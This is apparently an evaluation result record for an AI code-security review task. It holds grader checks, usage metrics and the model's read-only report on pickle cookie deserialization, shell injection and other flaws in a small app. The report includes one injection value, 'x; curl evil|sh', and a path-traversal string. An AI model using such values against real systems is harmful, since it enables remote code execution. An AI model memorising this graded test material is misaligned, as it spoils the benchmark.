@@ -1,0 +1,100 @@
+{
+  "case": "h5-review#t2",
+  "arm": "vanilla",
+  "model": "sonnet",
+  "checks": {
+    "read_only": true,
+    "names_pickle_session": true,
+    "names_command_injection": true,
+    "decoy_not_reported_as_vuln": true
+  },
+  "passed": true,
+  "score": 1.0,
+  "segments": 1,
+  "tools": {
+    "Bash": 2
+  },
+  "agent_calls": 0,
+  "agent_types": [],
+  "agent_descriptions": [],
+  "final": "I read all six modules (about 98 lines). I found two serious problems and two minor ones. I changed no files.\n\n## High severity\n\n**1. Remote code execution through the session cookie** (`taskboard/session.py:9-13`)\n- `load_session` runs `pickle.loads` on the raw `tb_session` cookie. The cookie is unsigned and unencrypted.\n- Anyone can craft a cookie that runs arbitrary code on the server when it is loaded. A pickle `__reduce__` payload is enough, and no login is needed.\n- **Fix:** Don't use pickle for cookies. Store JSON and sign it with HMAC (`notify.sign` already does this), or use a server-side session ID. Verify the signature before parsing anything.\n\n**2. Shell command injection in the export** (`taskboard/exports.py:7-8`)\n- `project` is typed by the user. It goes into an f-string that runs with `shell=True`, and it is also used as the filename. A name like `x; curl evil|sh` or `$(...)` runs arbitrary commands.\n- `attachments_dir` and `out_dir` are interpolated the same way. They are also unquoted, so spaces break the command.\n- Path traversal: `project=\"../../etc/foo\"` writes the archive outside `out_dir`.\n- **Fix:**\n  - Call `subprocess.run([\"zip\", \"-rq\", archive, attachments_dir], check=True)` with no shell.\n  - Validate the project name against something like `^[A-Za-z0-9_-]+$`, or use `os.path.basename`.\n  - Check that the resolved archive path stays inside `out_dir`.\n  - Consider Python's `zipfile` module, which avoids the external binary.\n  - A project name starting with `-` could be read as a flag. Use `--` before the path arguments.\n\n## Low severity\n\n**3. Hardcoded fallback signing key** (`taskboard/notify.py:7`)\n- If `TB_SIGNING_KEY` isn't set, the code silently uses `\"dev-only-key\"`. Anyone who can read the source can forge signatures.\n- **Fix:** Fail at startup when the variable is missing in production.\n\n**4. No authorization in queries** (`taskboard/queries.py:13-14`)\n- `tasks_for_owner` and `list_tasks` return data for whatever owner or project is passed in. This is only a problem if the caller passes user-controlled values without checking them against the logged-in user. Combined with the forgeable session in #1, it is trivially exploitable.\n\n## Checked and fine\n- **SQL injection:** `queries.py` is safe. Values are parameterized. The `sort` value goes through a whitelist, so the f-string interpolation is harmless. `db.add_task` is also parameterized.\n- **Signature comparison:** `notify.verify` uses `hmac.compare_digest`, which is constant-time.\n- **Database:** It is an in-memory SQLite database, so data is lost on restart and the connection is a shared global. That is a reliability and thread-safety concern, not a security one.\n\nI'd fix #1 and #2 first. Both let an unauthenticated or low-privilege user run code on the server.",
+  "is_error": false,
+  "num_turns": 3,
+  "duration_ms": 14969,
+  "cost_usd": 0.051604399999999995,
+  "usage": {
+    "input_tokens": 6,
+    "cache_creation_input_tokens": 7195,
+    "cache_read_input_tokens": 101124,
+    "output_tokens": 1270
+  },
+  "model_usage": {
+    "claude-sonnet-5-5": {
+      "inputTokens": 6,
+      "outputTokens": 1270,
+      "cacheReadInputTokens": 101124,
+      "cacheCreationInputTokens": 7195,
+      "webSearchRequests": 0,
+      "costUSD": 0.051604399999999995,
+      "contextWindow": 200000,
+      "maxOutputTokens": 128000,
+      "thinkingTokens": 0,
+      "cacheCreationEphemeral5mInputTokens": 0,
+      "cacheCreationEphemeral1hInputTokens": 7195,
+      "canonicalModel": "claude-sonnet-5-5",
+      "provider": "firstParty",
+      "costBasis": "list"
+    }
+  },
+  "subagent_stats": {
+    "spawned": 0,
+    "requested": {
+      "background": 0,
+      "foreground": 0,
+      "unset": 0
+    },
+    "started_in_background": 0,
+    "max_depth": 0,
+    "spawned_by_subagents": 0,
+    "completed": 0,
+    "failed": 0,
+    "killed": {
+      "parent": 0,
+      "user": 0,
+      "system": 0
+    },
+    "refused": {
+      "depth_limit": 0,
+      "concurrency_limit": 0,
+      "budget": 0
+    },
+    "by_type": {}
+  },
+  "permission_denials": 0,
+  "wall_s": 16.0,
+  "claude_rc": 0,
+  "invalid": null,
+  "workspace": "/tmp/ult-live-h/h5-review#t2__vanilla",
+  "transcript": "/tmp/ult-live-h/h5-review#t2__vanilla.jsonl",
+  "arch": {
+    "new_counts": {},
+    "arch_findings": 0,
+    "arch_blocking": 0
+  },
+  "metrics": {
+    "pass": true,
+    "graders_pass": true,
+    "total_cost_usd": 0.051604399999999995,
+    "input_tokens": 6,
+    "output_tokens": 1270,
+    "cache_read_tokens": 101124,
+    "cache_write_tokens": 7195,
+    "turns": 3,
+    "subagents": 0,
+    "invalid": false,
+    "arch_measured": true,
+    "arch_blocking": 0,
+    "arch_findings": 0,
+    "total_tokens": 109595
+  }
+}
